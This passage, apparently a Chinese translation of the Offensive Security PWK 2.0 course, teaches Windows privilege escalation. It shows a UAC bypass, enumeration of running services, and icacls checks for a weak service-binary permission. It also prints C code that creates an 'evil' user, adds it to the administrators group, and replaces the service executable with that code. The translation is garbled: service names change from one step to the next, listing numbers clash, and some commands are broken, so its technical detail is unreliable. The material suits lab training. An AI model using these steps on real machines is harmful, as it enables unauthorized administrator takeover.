
**whoami groups**命令的输出表明这是一个完整性 shell。接下来，我们将更改管理员密码以查看是否可以成功绕过 UAC。

```
C:\Windows\system32> net user admin Evilpass
```

**命令执行成功。**列表 563 - 通过 folderhelper.exe 生成高完整性 cmd 后修改管理员密码

密码更改成功，我们成功绕过了 UAC！这次攻击不仅演示了强大的 UAC 绕过，还揭示了一个我们可以用于发现类似问题的进程。

PWK 2.0

版权 © Offensive Security Ltd. 保留所有权利。

554

# 使用 Kali Linux 2.0 进行渗透测试

## 练习 18.2.3

1. 以管理员身份登录您的 Windows 客户端并尝试使用上述技术绕过 UAC。

如前所述，在 Windows 上提升权限的常用方法是利用以系统运行的服务的不安全权限。例如，考虑一种场景：软件人员创建一个以系统身份运行的程序。在安装期间，开发者没有保护该程序的权限。结果是，低权限用户可以将程序替换为恶意程序。当服务重启或机器重启时，恶意文件将以 SYSTEM 权限执行。我们的 Windows 客户端上存在此漏洞。让我们验证并利用该漏洞。在之前的一个章节中，我们展示了如何使用 `tasklist` 列出服务。或者，我们可以使用 PowerShell `Get-Wmi` 令配合 `win32_service` 类。在这个示例中，我们将输出管道到 `Select-Object` 以显示我们感兴趣的字段，并使用 `Where-Object -property {$.State - 'Running'}`。

```
PS C:\Users\student Get-WmiObject win32_service | Select-Object Name, State | Where-Object {$.State - 'Running'}
```

| 名称 | 状态 | 路径名称 |
|---|---|---|
| AudioEndpointBuilder | Running | C:\Windows\System32\svchost.exe -k LocalSystem |
| AudioSrv | Running | C:\Windows\System32\svchost.exe -k LocalNetworkService |
| Power | Running | C:\Windows\System32\svchost.exe -k DComLaunch |
| ProfSvc | Running | C:\Windows\System32\svchost.exe -k netsvcs |
| RpcEtMapper | Running | C:\Windows\System32\svchost.exe -k RPCSS |
| RpcsS | Running | C:\Windows\System32\svchost.exe -k rpcss |
| SamSvc | Running | C:\Windows\System32\svass.exe |
| Schedule | Running | C:\Windows\System32\svchost.exe -k netsvcs |
| SENS | Running | C:\Windows\System32\svchost.exe -k netsvcs |
| Serviis | Running | C:\ProgramFiles\Serviis\bin\ServiisService.exe |
| ShellHWDetection | Running | C:\Windows\System32\svchost.exe -k netsvcs |

> 列表 564 - 使用 PowerShell 列出运行的服务

根据此输出，Serviis 服务脱颖而出，因为它安装在 Program Files 目录中。这意味着该服务安装良好，且软件开发者负责目录结构和权限。这些情况使其更容易受到此类漏洞的影响。

[524] (Microsoft, 2019), https://docs.microsoft.com/en-us/windows/32/secauthz/known-s

PWK 2.0

版权 © Offensive Security Ltd. 保留所有权利。

555

# 攻击性安全：使用 Kali Linux 进行渗透 2.0

下一步，我们将使用 Windows 工具 `icacls` 目标服务的权限。该工具将输出服务的安全标识符（或 SIDs⁶），后跟一个权限掩码，该掩码在 `icacls` 文档中有定义。⁷ 以下是最相关的掩码和权限：

| 掩码 | 权限 |
|---|---|
| F | 完全访问 |
| M | 修改访问 |
| RX | 读取和执行访问 |
| R | 只读访问 |
| W | 仅写访问 |

表 7 - icacls 权限掩码

我们可以使用完整的服务名称作为参数运行 `icacls`。该命令将输出枚举的权限：

```
C:\Users\student icacls "C:\Program Files\Service\bin\Service.exe"
C:\Program Files\Service\bin\Service.exe BUILTIN\Users:(I) (F)
NT AUTHORITY\SYSTEM:(I) (F)
BUILTIN\Administrators:(I) (F)
APPLICATION PACKAGE AUTHORITY\ALL APPL
```

成功处理了 1 个文件；失败 0 个文件

列表 5 - Service.exe 服务的 icacls 输出

正如所料的，与 `Service.exe` 可执行文件相关的权限非常有趣。具体来说，系统上的任何用户（BUILTIN\Users）似乎对其具有完全的读写访问。这是一个严重的漏洞。⁸

为了利用此漏洞，我们可以将 `Service.exe` 替换为自己的恶意二进制文件，并通过重启服务或重启机器来触发它。

我们将通过一个示例来演示这一点。以下代码将使用系统⁹ 函数创建一个新用户 "evil"，并将其添加到本地管理员组中。该代码的编译后的版本将用作我们的恶意二进制文件。

```c
#include <stdlib.h>

int main () {

int i;

i = system("net user evil ev!pass /add");
i = system("net localgroup administrators evil /add");
return 0;
}
```

> ⁵⁵ (Microsoft, 2018), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls  
> ⁵⁶ (Microsoft, 2017), https://support.microsoft.com/en-us/24330/well-known-security-identifiers-in-windows-operating-systems  
> ⁵⁷ (Microsoft, 2018), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls#remarks  
> ⁵⁸ (Gojo Krstic, 2017), https://www.exploit-db.com/articles/41959/  
> ⁹ (Microsoft, 2016), https://docs.microsoft.com/en-us/cpp/c-runtime/library/reference/ms-system?view=vs-2019

列表 566 - adderuser.c 代码

接下来，我们将使用 `i686-w64-mingw32-gcc` 在 Kali 上进行交叉编译，使用 `-o` 指定编译后可执行文件名称：

```bash
kali@kali:~i686-w64-mingw32-gcc adderuser.c -o adderuser.exe
```

列表 567 - 编译 adderuser.c

我们可以将其传输到目标，并用恶意副本替换原始的 `ServioService.exe` 二进制文件：

```cmd
C:\Users\student move "C:\Program Files\Servio\bin\ServioService.exe" "C:\Program Files\Servio\bin\ServioService_original.exe"
1(s) moved.
```

```cmd
C:\Users\student move adderuser.exe "C:\Program Files\Servio\bin\ServioService.exe"
1(s) moved.
```
